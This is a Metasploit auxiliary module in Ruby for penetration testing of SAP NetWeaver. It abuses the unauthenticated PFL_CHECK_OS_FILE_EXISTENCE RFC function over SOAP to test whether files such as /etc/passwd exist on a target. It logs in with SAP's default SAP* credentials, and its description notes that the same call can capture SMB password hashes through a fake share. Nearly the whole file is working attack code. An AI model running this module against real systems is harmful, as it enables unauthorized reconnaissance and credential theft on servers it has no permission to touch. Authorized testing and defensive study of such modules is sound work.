##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check',
			'Description' => %q{
					This module abuses the SAP NetWeaver PFL_CHECK_OS_FILE_EXISTENCE function, on
				the SAP SOAP RFC Service, to check for files existence on the remote file system.
				The module can also be used to capture SMB hashes by using a fake SMB share as
				FILEPATH.
			},
			'References' =>
				[
					[ 'OSVDB', '78537' ],
					[ 'BID', '51645' ],
					[ 'URL','http://erpscan.com/advisories/dsecrg-12-009-sap-netweaver-pfl_check_os_file_existence-missing-authorisation-check-and-smb-relay-vulnerability/' ]
				],
			'Author' =>
				[
					'lexey Tyurin', # Vulnerability discovery
					'nmonkee' # Metasploit module
				],
			'License' => MSF_LICENSE
		)

		register_options([
			OptString.new('CLIENT', [true, 'SAP Client', '001']),
			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
			OptString.new('PASSWORD', [true, 'Password', '06071992']),
			OptString.new('FILEPATH',[true,'File Path to check for  (e.g. /etc)','/etc/passwd'])
		], self.class)
	end

	def run_host(ip)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
		data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<SOAP-ENV:Header/>'
		data << '<SOAP-ENV:Body>'
		data << '<PFL_CHECK_OS_FILE_EXISTENCE xmlns="urn:sap-com:document:sap:rfc:functions">'
		data << '<FULLY_QUALIFIED_FILENAME></FULLY_QUALIFIED_FILENAME>'
		data << '<LONG_FILENAME>' + datastore['FILEPATH'] + '</LONG_FILENAME>'
		data << '</PFL_CHECK_OS_FILE_EXISTENCE>'
		data << '</SOAP-ENV:Body>'
		data << '</SOAP-ENV:Envelope>'
		begin
			vprint_status("#{rhost}:#{rport} - Sending request to check #{datastore['FILEPATH']}")
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc',
				'method' => 'POST',
				'data' => data,
				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'ctype' => 'text/xml; charset=UTF-8',
				'headers' => {
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
				},
				'vars_get' => {
					'sap-client' => datastore['CLIENT'],
					'sap-language' => 'EN'
				}
			})
			if res and res.code == 200 and res.body =~ /PFL_CHECK_OS_FILE_EXISTENCE\.Response/
				if res.body =~ /<FILE_EXISTS>X<\/FILE_EXISTS>/
					print_good("#{rhost}:#{rport} - File #{datastore['FILEPATH']} exists")
				else
					print_warning("#{rhost}:#{rport} - File #{datastore['FILEPATH']} DOESN'T exist")
				end
			elsif res
				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
				vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
				vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
			end
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Unable to connect")
			return
		end
	end
end
